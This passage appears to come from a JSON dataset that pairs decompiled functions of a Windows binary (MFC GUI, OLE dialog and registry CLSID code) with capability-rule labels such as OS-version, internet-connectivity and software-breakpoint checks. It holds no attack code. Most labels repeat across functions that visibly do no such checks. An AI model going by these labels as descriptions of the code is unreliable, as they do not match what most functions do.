            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451d56(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    int32_t *in_ECX;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(1);\n    if (iVar2 < 0) {\n        return;\n    }\n    iVar3 = fcn.0042b82c();\n    var_8h = iVar3;\n    (*_sym.imp.USER32.dll_GetCursorPos)(&var_10h);\n    (*_sym.imp.USER32.dll_ScreenToClient)(in_ECX[8], &var_10h);\n    var_4h = (**(*in_ECX + 0x6c))(var_10h, var_ch, 0);\n    if (var_4h < 0) {\n        *(iVar3 + 0x4c) = 0xffffffff;\n    }\n    else {\n        iVar4 = fcn.0041ffa6();\n        iVar5 = fcn.004210fc();\n        if (iVar5 == 0) {\ncode_r0x00451dd1:\n            var_4h = -1;\n        }\n        else {\n            if (iVar4 == 0) {\n                fcn.0041901a();\n            }\n            iVar5 = fcn.0042271e();\n            if (iVar5 == 0) goto code_r0x00451dd1;\n        }\n        if (*(iVar3 + 0x3c) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = *(*(iVar3 + 0x3c) + 0x20);\n        }\n        uVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        piVar7 = fcn.0041e67e(uVar6);\n        if (piVar7 != in_ECX) {\n            if (piVar7 == NULL) {\n                iVar5 = 0;\n            }\n            else {\n                iVar5 = piVar7[8];\n            }\n            if ((iVar5 != iVar3) && (iVar3 = fcn.0041ffa6(),  iVar3 == iVar4)) {\n                var_4h = -1;\n            }\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_KillTimer;\n    if (-1 < var_4h) {\n        (*_sym.imp.USER32.dll_ClientToScreen)(in_ECX[8], &var_10h);\n        iVar3 = (*_sym.imp.USER32.dll_WindowFromPoint)(var_10h, var_ch);\n        if (iVar3 == 0) {\ncode_r0x00451e66:\n            var_4h = -1;\n            *(var_8h + 0x4c) = 0xffffffff;\n        }\n        else if ((iVar3 != in_ECX[8]) && (iVar4 = (*_sym.imp.USER32.dll_IsChild)(in_ECX[8], iVar3),  iVar4 == 0)) {\n            iVar4 = *(var_8h + 0x3c);\n            if (iVar4 != 0) {\n                iVar4 = *(iVar4 + 0x20);\n            }\n            if (iVar4 != iVar3) goto code_r0x00451e66;\n        }\n        if (-1 < var_4h) goto code_r0x00451e96;\n    }\n    if (*(var_8h + 0x4c) == -1) {\n        (*pcVar1)(in_ECX[8], 0xe001);\n    }\n    (**(*in_ECX + 0x164))(0xffffffff);\ncode_r0x00451e96:\n    if ((arg_8h == 0xe000) && ((*pcVar1)(in_ECX[8], 0xe000),  -1 < var_4h)) {\n        (**(*in_ECX + 0x164))(var_4h);\n    }\n    return;\n}\n",
        "token_count": 929
    },
    "004521b2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004521b2(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((in_ECX[0x23] != 0) && (iVar1 = (**(*in_ECX + 0x6c))(arg_ch, arg_10h, 0),  iVar1 == -1)) {\n        (*_sym.imp.USER32.dll_ClientToScreen)(in_ECX[8], &arg_ch);\n        (***in_ECX[0x24])(arg_ch, arg_10h);\n        return;\n    }\n    fcn.0041e5da();\n    return;\n}\n",
        "token_count": 156
    },
    "00452a4e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00452a4e(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    \n    uVar1 = 0;\n    uVar2 = *(param_1 + 0x78) & 0xa000;\n    if (*(param_1 + 0x7c) != 0) {\n        uVar2 = uVar2 == 0;\n    }\n    if ((uVar2 == 0) || ((*(param_1 + 0x70) & 0xa000) == 0)) {\n        if ((*(param_1 + 0x70) & 0x5000) == 0) goto code_r0x00452aac;\n        uVar1 = *(param_1 + 0x70) & 0xffff5fff;\n        puVar3 = param_1 + 0x38;\n    }\n    else {\n        uVar1 = *(param_1 + 0x70) & 0xffffafff;\n        puVar3 = param_1 + 0x28;\n    }\n    uVar1 = fcn.00455e2b(*puVar3, puVar3[1], puVar3[2], puVar3[3], uVar1, 0);\ncode_r0x00452aac:\n    if ((*(param_1 + 0x7c) == 0) && (uVar1 == 0)) {\n        if ((*(param_1 + 0x70) & 0xa000) != 0) {\n            fcn.00455e2b(*(param_1 + 0x38), *(param_1 + 0x3c), *(param_1 + 0x40), *(param_1 + 0x44), \n                         *(param_1 + 0x70) & 0xffffafff, 0);\n            uVar2 = *(param_1 + 0x70) & 0xffffafff;\n            uVar1 = fcn.00455e2b(*(param_1 + 0x28), *(param_1 + 0x2c), *(param_1 + 0x30), *(param_1 + 0x34), uVar2, 0);\n            uVar1 = ~-(uVar1 != uVar2) & uVar1;\n            if (uVar1 != 0) {\n                return uVar1;\n            }\n        }\n        if ((*(param_1 + 0x70) & 0x5000) != 0) {\n            fcn.00455e2b(*(param_1 + 0x28), *(param_1 + 0x2c), *(param_1 + 0x30), *(param_1 + 0x34), \n                         *(param_1 + 0x70) & 0xffff5fff, 0);\n            uVar2 = *(param_1 + 0x70) & 0xffff5fff;\n            uVar1 = fcn.00455e2b(*(param_1 + 0x38), *(param_1 + 0x3c), *(param_1 + 0x40), *(param_1 + 0x44), uVar2, 0);\n            uVar1 = ~-(uVar1 != uVar2) & uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 762
    },
    "00452e5d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452e5d(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t arg_24h;\n    int32_t in_ECX;\n    uint *puVar3;\n    uint lprc;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 1;\n    var_10h = 1;\n    uVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0);\n    var_8h = fcn.0041a541(uVar2);\n    var_ch = var_8h;\n    var_4h = fcn.0042eab6();\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if ((*(in_ECX + 0x74) & 0xa000) == 0) {\n        if ((*(in_ECX + 0x74) & 0x5000) == 0) {\n            var_14h = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x20);\n            var_14h = var_14h + -1;\n            var_10h = (*pcVar1)(0x21);\n            var_10h = var_10h + -1;\n            if ((((*(in_ECX + 0x78) & 0xa000) == 0) || (*(in_ECX + 0x7c) != 0)) &&\n               (((*(in_ECX + 0x78) & 0x5000) == 0 || (*(in_ECX + 0x7c) == 0)))) {\n                puVar3 = in_ECX + 0x58;\n            }\n            else {\n                puVar3 = in_ECX + 0x48;\n            }\n            var_8h = var_4h;\n        }\n        else {\n            puVar3 = in_ECX + 0x38;\n        }\n    }\n    else {\n        puVar3 = in_ECX + 0x28;\n    }\n    lprc = *puVar3;\n    uStack36 = puVar3[1];\n    uStack32 = puVar3[2];\n    uStack28 = puVar3[3];\n    if (arg_8h != 0) {\n        var_10h = 0;\n        var_14h = 0;\n    }\n    if ((*(in_ECX + 0x74) & 0xf000) != 0) {\n        (*_sym.imp.USER32.dll_InflateRect)(&lprc, 0xffffffff, 0xffffffff);\n    }\n    arg_24h = var_4h;\n    if (*(in_ECX + 0x24) == 0) {\n        arg_24h = var_ch;\n    }\n    fcn.0042eb59(&lprc, var_14h, var_10h, in_ECX + 0xc, *(in_ECX + 0x1c), *(in_ECX + 0x20), var_8h, arg_24h);\n    *(in_ECX + 0xc) = lprc;\n    *(in_ECX + 0x1c) = var_14h;\n    *(in_ECX + 0x10) = uStack36;\n    *(in_ECX + 0x20) = var_10h;\n    *(in_ECX + 0x14) = uStack32;\n    *(in_ECX + 0x18) = uStack28;\n    *(in_ECX + 0x24) = var_8h == var_4h;\n    return;\n}\n",
        "token_count": 850
    },
    "00452f68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00452f68(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (*param_2 != param_3) {\n        *param_2 = param_3;\n        if ((((*(param_1 + 0x70) & 0xa000) == 0) || ((*(param_1 + 0x70) & 0x5000) == 0)) || (*(param_1 + 0x7c) == 0)) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 1;\n        }\n        *(param_1 + 0x7c) = uVar1;\n        if (*(param_1 + 0x80) == 0) {\n            uVar1 = fcn.00452a4e();\n        }\n        else {\n            uVar1 = 0;\n        }\n        *(param_1 + 0x74) = uVar1;\n        fcn.00452e5d(0);\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "00452fbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452fbc(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_OffsetRect;\n    iVar4 = arg_8h - *(in_ECX + 4);\n    iVar2 = arg_ch - *(in_ECX + 8);\n    (*_sym.imp.USER32.dll_OffsetRect)(in_ECX + 0x28, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x48, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x38, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x58, iVar4, iVar2);\n    *(in_ECX + 4) = arg_8h;\n    *(in_ECX + 8) = arg_ch;\n    if (*(in_ECX + 0x80) == 0) {\n        uVar3 = fcn.00452a4e();\n    }\n    else {\n        uVar3 = 0;\n    }\n    *(in_ECX + 0x74) = uVar3;\n    fcn.00452e5d(0);\n    return;\n}\n",
        "token_count": 310
    },
    "00453225": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453225(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint arg_10h;\n    uint *puVar2;\n    uint arg_ch;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    int32_t var_4h;\n    \n    fcn.004531e0();\n    if (*(param_1 + 0x74) == 0) {\n        uVar1 = *(param_1 + 0x78);\n        if ((((uVar1 & 4) == 0) && (((uVar1 & 0xa000) == 0 || (*(param_1 + 0x7c) != 0)))) &&\n           (((uVar1 & 0x5000) == 0 || (*(param_1 + 0x7c) == 0)))) {\n            uVar1 = *(param_1 + 0x70) & 0x40 | 0x1000;\n            *(param_1 + 0xa8) = *(param_1 + 0x58);\n            arg_10h = *(param_1 + 0x5c);\n            arg_ch = *(param_1 + 0x58);\n        }\n        else {\n            uVar1 = *(param_1 + 0x70) & 0x40 | 0x2000;\n            *(param_1 + 0xa8) = *(param_1 + 0x48);\n            arg_10h = *(param_1 + 0x4c);\n            arg_ch = *(param_1 + 0x48);\n        }\n        *(param_1 + 0xac) = arg_10h;\n        *(param_1 + 0xa4) = uVar1;\n        fcn.00455cfb(*(param_1 + 0x68), arg_ch, arg_10h, uVar1);\n    }\n    else {\n        var_4h = fcn.00452b6c(*(param_1 + 0x74));\n        puVar2 = param_1 + 0x38;\n        if ((*(param_1 + 0x74) & 0x5000) == 0) {\n            puVar2 = param_1 + 0x28;\n        }\n        var_14h = *puVar2;\n        uStack20 = puVar2[1];\n        uStack16 = puVar2[2];\n        uStack12 = puVar2[3];\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(var_4h + 0x20));\n        if ((uVar1 & 0xffff) - 0xe81b < 4) {\n            *(param_1 + 0x90) = uVar1 & 0xffff;\n            *(param_1 + 0x94) = var_14h;\n            *(param_1 + 0x98) = uStack20;\n            *(param_1 + 0x9c) = uStack16;\n            *(param_1 + 0xa0) = uStack12;\n            fcn.00419ea1(param_1 + 0x94);\n        }\n        fcn.00455b4c(*(param_1 + 0x68), var_4h, &var_14h);\n        (**(**(param_1 + 0x6c) + 0x148))(1);\n    }\n    return;\n}\n",
        "token_count": 768
    },
    "0045391e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0045391e(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        param_2 = 0x11;\n    }\n    if (*(param_1 + 4) != 0) {\n        fcn.004170df(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.004170b4(-(param_2 * 4 >> 0x20 != 0) | param_2 * 4);\n        *(param_1 + 4) = uVar1;\n        fcn.00459330(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 211
    },
    "004539ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004539ac(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar3 = fcn.00436335(param_1 + 0x14, *(param_1 + 0x18), 0x10);\n        iVar1 = *(param_1 + 0x18);\n        puVar4 = iVar3 + -0xc + iVar1 * 0x10;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar4 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar4;\n            puVar4 = puVar4 + -4;\n        }\n    }\n    puVar4 = *(param_1 + 0x10);\n    uVar2 = *puVar4;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar2;\n    if (puVar4 != 0xfffffff8) {\n        fcn.004018d0();\n    }\n    puVar4[3] = 0;\n    return puVar4;\n}\n",
        "token_count": 308
    },
    "00453f1d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00453f1d(char **param_1, uint param_2, uint param_3, int32_t param_4, char *param_5)\n\n{\n    char *arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY300;\n    int32_t iStackY296;\n    char **ppcStackY292;\n    char *pcStackY288;\n    int32_t iStackY284;\n    char **ppcStackY280;\n    char *pcStackY276;\n    uchar *in_stack_ffffff00;\n    \n    fcn.00458e45();\n    ppcStackY292 = param_1;\n    pcStackY288 = param_5;\n    fcn.00423280();\n    fcn.00401680();\n    fcn.00423280();\n    pcStackY276 = 0x453f7c;\n    fcn.00401680();\n    uStackY300 = 0;\n    if (param_5 == 0x80000000) {\n        pcStackY276 = &stack0xfffffed4;\n        ppcStackY280 = 0x20019;\n        iStackY284 = 0;\n        pcStackY288 = \"CLSID\";\n        ppcStackY292 = 0x80000000;\n        iStackY296 = 0x453fa0;\n        (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA;\n    arg_ch = *param_1;\n    while (arg_ch != NULL) {\n        ppcStackY292 = ppcStackY292 + 1;\n        if ((pcStackY288 != 0x80000000) || (*arg_ch != '\\0')) {\n            ppcStackY280 = 0x453fd6;\n            pcStackY276 = arg_ch;\n            iVar2 = (*pcVar1)();\n            ppcStackY280 = arg_ch + iVar2 + 1;\n            in_stack_ffffff00 = &stack0xfffffee4;\n            fcn.004441f9(in_stack_ffffff00, arg_ch, param_2, param_3);\n            pcStackY276 = 0x454005;\n            fcn.004441f9(&stack0xfffffed8, ppcStackY280, param_2, param_3);\n            if ((pcStackY288 != 0x80000000) || (*(iStackY284 + -0xc) != 0)) {\n                if (param_4 == 0) {\n                    pcStackY276 = &stack0xfffffee8;\n                    ppcStackY280 = 0x100;\n                    ppcStackY292 = 0x454035;\n                    iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueA)();\n                    if (iVar2 == 0) goto code_r0x00454059;\n                }\n                iVar2 = iStackY296;\n                pcStackY276 = iStackY296;\n                ppcStackY280 = 0x454045;\n                ppcStackY292 = (*pcVar1)();\n                iStackY284 = iVar2;\n                pcStackY288 = 0x1;\n                iStackY296 = 1;\n                uStackY300 = 0x454055;\n                ppcStackY280 = ppcStackY292;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueA)();\n                if (iVar2 != 0) break;\n            }\n        }\ncode_r0x00454059:\n        arg_ch = *ppcStackY292;\n    }\n    pcStackY276 = 0x454079;\n    fcn.004366f9();\n    pcStackY276 = 0x454084;\n    fcn.004010d0();\n    pcStackY276 = 0x45408f;\n    fcn.004010d0();\n    *in_FS_OFFSET = pcStackY276;\n    fcn.004566a8(in_stack_ffffff00);\n    return;\n}\n",
        "token_count": 891
    },
    "004542e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.004542e2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00458e45(8);\n    iVar3 = *(unaff_EBP + 0x1c);\n    iVar2 = *(unaff_EBP + 0x18);\n    if (iVar3 == 0) {\n        iVar3 = *(iVar2 * 8 + 0x491b14);\n    }\n    iVar1 = *(unaff_EBP + 0x20);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0042b7b9();\n        if (*(iVar1 + 0x14) == '\\0') {\n            iVar1 = *(iVar2 * 8 + 0x491b18);\n        }\n        else {\n            iVar1 = *(iVar2 * 8 + 0x491b40);\n        }\n    }\n    fcn.00453cbb(10);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.004540b7(unaff_EBP + -0x14, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                         *(unaff_EBP + 0x14), *(unaff_EBP + 0x24), *(unaff_EBP + 0x28), *(unaff_EBP + 0x2c));\n    if (((iVar2 != 0) && (iVar3 = fcn.00453f1d(iVar3, *(unaff_EBP + -0x14), 10, 0, 0x80000000),  iVar3 != 0)) &&\n       (iVar1 != 0)) {\n        fcn.00453f1d(iVar1, *(unaff_EBP + -0x14), 10, 1, 0x80000000);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00453cf6();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 588
    },
    "00454395": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.00454395(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00458e45(8);\n    iVar3 = *(unaff_EBP + 0x1c);\n    iVar2 = *(unaff_EBP + 0x18);\n    if (iVar3 == 0) {\n        iVar3 = *(iVar2 * 8 + 0x491b14);\n    }\n    iVar1 = *(unaff_EBP + 0x20);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0042b7b9();\n        if (*(iVar1 + 0x14) == '\\0') {\n            iVar1 = *(iVar2 * 8 + 0x491b18);\n        }\n        else {\n            iVar1 = *(iVar2 * 8 + 0x491b40);\n        }\n    }\n    fcn.00453cbb(10);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.004540b7(unaff_EBP + -0x14, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                         *(unaff_EBP + 0x14), 0, 0, 0);\n    if (((iVar2 != 0) && (iVar3 = fcn.00453e60(iVar3, *(unaff_EBP + -0x14), 10, 0x80000000),  iVar3 != 0)) &&\n       (iVar1 != 0)) {\n        fcn.00453e60(iVar1, *(unaff_EBP + -0x14), 10, 0x80000000);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00453cf6();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 534
    },
    "00454585": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454585(int32_t *param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint unaff_ESI;\n    int32_t *unaff_EDI;\n    int32_t *piVar4;\n    \n    piVar4 = param_1 + 4;\n    if (*piVar4 != 0) {\n        (**(*param_1 + 0x48))();\n        fcn.00430b55(piVar4);\n        unaff_EDI = piVar4;\n    }\n    param_1 = param_1 + 5;\n    iVar3 = *param_1;\n    ppiVar1 = iVar3 + -0x10;\n    piVar4 = *ppiVar1;\n    if (*(iVar3 + -0xc) != 0) {\n        piVar2 = iVar3 + -4;\n        if (*(iVar3 + -4) < 0) {\n            if (*(iVar3 + -8) < 0) {\n                fcn.00401070(0x80070057);\n                iVar3 = extraout_ECX;\n            }\n            *(iVar3 + -0xc) = 0;\n            **param_1 = 0;\n            return;\n        }\n        LOCK();\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar3 == 1 || iVar3 + -1 < 0) {\n            (**(**ppiVar1 + 4))(ppiVar1, unaff_EDI, unaff_ESI);\n        }\n        iVar3 = (**(*piVar4 + 0xc))();\n        *param_1 = iVar3 + 0x10;\n    }\n    return;\n}\n",
        "token_count": 397
    },
    "00454cbb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00454cbb(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CSharedFile.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[8] != NULL) {\n        fcn.00443f52();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00444069();\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 164
    },
    "00454e58": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00454e58(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x74) = param_2;\n    if (param_2 != 1) {\n        param_2 = ((param_2 != 2) - 1 & 3) - 1;\n    }\n    return param_2;\n}\n",
        "token_count": 89
    },
    "00454f02": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00454f02(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t hWnd;\n    \n    iVar2 = *(param_1 + 0x68);\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + 0x20);\n    }\n    hWnd = param_1;\n    uVar1 = fcn.00426675(iVar2, &hWnd);\n    *(param_1 + 0x80) = uVar1;\n    fcn.00420922(param_1);\n    iVar2 = sub.oledlg.dll_OleUIBusyA(param_1 + 0x78);\n    fcn.0041e726();\n    fcn.0041e6f8();\n    if (hWnd != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(hWnd, 1);\n    }\n    uVar1 = 2;\n    if (iVar2 != 2) {\n        if (iVar2 == 0x75) {\n            *(param_1 + 0xa4) = 1;\n        }\n        else {\n            if (iVar2 != 0x76) {\n                if (iVar2 == 0x77) {\n                    *(param_1 + 0xa4) = 3;\n                    return 1;\n                }\n                uVar1 = fcn.00454e58(iVar2);\n            }\n            *(param_1 + 0xa4) = uVar1;\n        }\n        return 1;\n    }\n    return 2;\n}\n",
        "token_count": 348
    },
    "0045535c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045535c(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    uint var_ch;\n    \n    fcn.00455285(&var_30h, arg_8h, arg_14h);\n    if (arg_10h != 0) {\n        uVar1 = fcn.00456177(&var_20h, 0x10, arg_10h, 0x10);\n        fcn.0040e7f0(uVar1);\n    }\n    var_ch = arg_ch;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x404, 0, &var_30h);\n    return;\n}\n",
        "token_count": 200
    },
    "004553b2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004553b2(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    uint var_10h;\n    uint32_t var_ch;\n    \n    fcn.00455285(&var_30h, arg_8h, arg_14h);\n    if (arg_10h != 0) {\n        uVar1 = fcn.00456177(&var_20h, 0x10, arg_10h, 0x10);\n        fcn.0040e7f0(uVar1);\n    }\n    iVar2 = fcn.0042b7b9();\n    var_10h = *(iVar2 + 0xc);\n    var_ch = arg_ch & 0xffff;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x404, 0, &var_30h);\n    return;\n}\n",
        "token_count": 250
    },
    "004554c1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
